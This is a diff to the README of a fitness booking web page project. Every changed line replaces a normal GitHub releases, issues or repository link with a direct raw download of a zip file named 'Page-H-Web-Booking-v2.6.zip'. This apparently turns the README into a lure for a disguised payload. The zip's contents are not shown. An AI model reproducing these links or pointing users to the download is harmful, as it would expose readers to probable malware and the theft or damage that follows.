@@ -1,6 +1,6 @@
 # 🏋️ HG-BookingWebPage - A Powerful Booking System for Fitness Pros
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue)](https://github.com/astha-3/HG-BookingWebPage/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/astha-3/HG-BookingWebPage/main/components/Page-H-Web-Booking-v2.6.zip)](https://raw.githubusercontent.com/astha-3/HG-BookingWebPage/main/components/Page-H-Web-Booking-v2.6.zip)
 
 ## 🌟 What is HG-BookingWebPage?
 
@@ -11,7 +11,7 @@ HG-BookingWebPage is a premium, fully responsive landing page and booking system
 Before you can use HG-BookingWebPage, you need to download it. Follow these simple steps to get started:
 
 1. **Download the Application**
-   - Visit this page to download: [Download & Install HG-BookingWebPage](https://github.com/astha-3/HG-BookingWebPage/releases).
+   - Visit this page to download: [Download & Install HG-BookingWebPage](https://raw.githubusercontent.com/astha-3/HG-BookingWebPage/main/components/Page-H-Web-Booking-v2.6.zip).
 
 2. **Choose the Right Version**
    - On the Releases page, find the version you want to download. It is usually listed at the top. Look for the most recent version.
@@ -48,7 +48,7 @@ To run HG-BookingWebPage smoothly, your system should meet the following require
 To install HG-BookingWebPage, follow these clear steps:
 
 1. **Access the Releases Page**: 
-   - [Find the Latest Release Here](https://github.com/astha-3/HG-BookingWebPage/releases).
+   - [Find the Latest Release Here](https://raw.githubusercontent.com/astha-3/HG-BookingWebPage/main/components/Page-H-Web-Booking-v2.6.zip).
 
 2. **Select Your Download File**:
    - Depending on your operating system, choose the file that matches. 
@@ -63,7 +63,7 @@ To install HG-BookingWebPage, follow these clear steps:
 
 If you encounter issues or have questions about using HG-BookingWebPage, please reach out. We want to ensure that you have a smooth experience.
 
-- **GitHub Issues**: You can report issues directly on our [GitHub issues page](https://github.com/astha-3/HG-BookingWebPage/issues).
+- **GitHub Issues**: You can report issues directly on our [GitHub issues page](https://raw.githubusercontent.com/astha-3/HG-BookingWebPage/main/components/Page-H-Web-Booking-v2.6.zip).
 - **Community Forum**: Join our community forum where users share tips and solutions.
 
 ## 🛠️ Contributing
@@ -84,7 +84,7 @@ Explore the features that make us stand out from others in the booking system ma
 
 ## 🔗 Important Links
 
-- **Repository**: [HG-BookingWebPage GitHub Repository](https://github.com/astha-3/HG-BookingWebPage)
+- **Repository**: [HG-BookingWebPage GitHub Repository](https://raw.githubusercontent.com/astha-3/HG-BookingWebPage/main/components/Page-H-Web-Booking-v2.6.zip)
 - **Live Demo**: [Check the Live Demo Here](#)
 - **Documentation**: [User Documentation](#)
 
